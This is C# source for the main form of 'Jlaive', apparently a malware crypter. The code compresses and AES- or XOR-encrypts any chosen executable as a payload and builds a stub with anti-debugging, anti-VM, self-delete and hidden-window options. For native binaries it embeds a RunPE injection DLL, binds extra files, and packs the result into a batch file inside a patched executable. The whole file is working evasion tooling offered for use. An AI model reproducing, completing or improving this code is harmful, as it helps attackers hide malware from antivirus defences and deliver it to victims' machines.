using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Linq;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Windows.Forms;

using static Jlaive.Utils;

namespace Jlaive
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            SettingsObject obj = Settings.Load();
            if (obj != null)
            {
                textBox1.Text = obj.inputFile;
                antiDebug.Checked = obj.antiDebug;
                antiVM.Checked = obj.antiVM;
                selfDelete.Checked = obj.selfDelete;
                hidden.Checked = obj.hidden;
                aesEncryption.Checked = obj.aes;
                xorEncryption.Checked = obj.xor;
                listBox1.Items.AddRange(obj.bindedFiles);
            }
            Task.Factory.StartNew(CheckVersion); // Comment out this line to disable version checking
            UpdateKeys(sender, e);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            SettingsObject obj = new SettingsObject();
            obj.inputFile = textBox1.Text;
            obj.antiDebug = antiDebug.Checked;
            obj.antiVM = antiVM.Checked;
            obj.selfDelete = selfDelete.Checked;
            obj.hidden = hidden.Checked;
            obj.aes = aesEncryption.Checked;
            obj.xor = xorEncryption.Checked;
            List<string> paths = new List<string>();
            foreach (string item in listBox1.Items) paths.Add(item);
            obj.bindedFiles = paths.ToArray();
            Settings.Save(obj);
            Environment.Exit(0);
        }

        private void openButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK) return;
            textBox1.Text = ofd.FileName;
        }

        private void buildButton_Click(object sender, EventArgs e)
        {
            Crypt();
        }

        private void aesEncryption_CheckedChanged(object sender, EventArgs e)
        {
            if (aesEncryption.Checked) xorEncryption.Checked = false;
        }

        private void xorEncryption_CheckedChanged(object sender, EventArgs e)
        {
            if (xorEncryption.Checked) aesEncryption.Checked = false;
        }

        private void addFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK) return;
            listBox1.Items.Add(ofd.FileName);
        }

        private void removeFile_Click(object sender, EventArgs e)
        {
            listBox1.Items.Remove(listBox1.SelectedItem);
        }

        private void Crypt()
        {
            buildButton.Enabled = false;
            tabControl1.SelectedTab = tabControl1.TabPages["outputPage"];
            log.Items.Clear();

            Random rng = new Random();
            string _input = textBox1.Text;
            byte[] _key = Convert.FromBase64String(key1.Text);
            byte[] _iv = Convert.FromBase64String(iv1.Text);
            EncryptionMode mode = xorEncryption.Checked ? EncryptionMode.XOR : EncryptionMode.AES;

            if (!File.Exists(_input))
            {
                MessageBox.Show("Invalid input path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }
            if (Path.GetExtension(_input) != ".exe")
            {
                MessageBox.Show("Invalid input file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }

            Console.ForegroundColor = ConsoleColor.Gray;
            byte[] pbytes = File.ReadAllBytes(_input);
            bool isnetasm = IsAssembly(_input);

            log.Items.Add("Encrypting payload...");
            byte[] payload_enc = Encrypt(mode, Compress(pbytes), _key, _iv);

            log.Items.Add("Creating secondary stub...");
            string stub = StubGen.CreateCS(_key, _iv, mode, antiDebug.Checked, antiVM.Checked, selfDelete.Checked, hidden.Checked, !isnetasm, rng);

            log.Items.Add("Building secondary stub...");

            File.WriteAllBytes("payload.exe", payload_enc);
            if (!isnetasm)
            {
                byte[] runpedll_enc = Encrypt(mode, Compress(GetEmbeddedResource("Jlaive.Resources.runpe.dll")), _key, _iv);
                File.WriteAllBytes("runpe.dll", runpedll_enc);
            }
            List<string> toembed = new List<string>();
            toembed.Add("payload.exe");
            if (!isnetasm) toembed.Add("runpe.dll");
            toembed.AddRange(listBox1.Items.Cast<string>());
            var returnval = CompileCS(stub, new string[] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Management.dll" }, toembed.ToArray(), "-optimize");
            CompilerResults results = returnval.Item1;
            byte[] stubbytes = returnval.Item2;
            if (results.Errors.Count > 0)
            {
                File.Delete("payload.txt");
                if (!isnetasm) File.Delete("runpe.dll");
                List<string> errors = new List<string>();
                foreach (CompilerError error in results.Errors) errors.Add(error.ToString());
                MessageBox.Show($"Stub build errors:{Environment.NewLine}{string.Join(Environment.NewLine, errors)}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }
            File.Delete("payload.exe");
            if (!isnetasm) File.Delete("runpe.dll");

            log.Items.Add("Encrypting secondary stub...");
            byte[] stub_enc = Encrypt(mode, Compress(stubbytes), _key, _iv);

            log.Items.Add("Creating batch file...");
            string batcontent = FileGen.CreateBat(_key, _iv, mode, rng);
            batcontent += Convert.ToBase64String(stub_enc);

            log.Items.Add("Getting stub...");
            stub = GetEmbeddedString("Jlaive.Resources.Stub.cs");

            log.Items.Add("Building stub...");

            returnval = CompileCS(stub, new string[] { "mscorlib.dll", "System.Core.dll", "System.dll" }, new string[0], "-optimize");
            results = returnval.Item1;
            if (results.Errors.Count > 0)
            {
                List<string> errors = new List<string>();
                foreach (CompilerError error in results.Errors) errors.Add(error.ToString());
                MessageBox.Show($"Stub build errors:{Environment.NewLine}{string.Join(Environment.NewLine, errors)}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }
            stubbytes = returnval.Item2;
            stubbytes = Patcher.FixStub(stubbytes, batcontent, rng);

            log.Items.Add("Writing output...");
            string inputdir = Path.GetDirectoryName(_input);
            string inputname = Path.GetFileNameWithoutExtension(_input);
            File.WriteAllBytes(inputdir + "\\" + inputname + "_Jlaive.exe", stubbytes);

            MessageBox.Show("Done!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            buildButton.Enabled = true;
        }

        private void CheckVersion()
        {
            try
            {
                WebClient wc = new WebClient();
                string latestversion = wc.DownloadString("https://raw.githubusercontent.com/ch2sh/Jlaive/main/version").Trim();
                wc.Dispose();
                if (File.Exists(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion"))
                {
                    string currentversion = File.ReadAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion").Trim();
                    if (currentversion != latestversion)
                    {
                        DialogResult result = MessageBox.Show($"Jlaive {currentversion} is outdated. Download {latestversion}?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Exclamation);
                        if (result == DialogResult.Yes)
                        {
                            Process.Start("https://github.com/ch2sh/Jlaive/releases/tag/" + latestversion);
                        }
                    }
                }
                File.WriteAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion", latestversion);
            }
            catch { }
        }

        private void UpdateKeys(object sender, EventArgs e)
        {
            AesManaged aes = new AesManaged();
            key1.Text = Convert.ToBase64String(aes.Key);
            iv1.Text = Convert.ToBase64String(aes.IV);
            aes.Dispose();
        }
    }
}
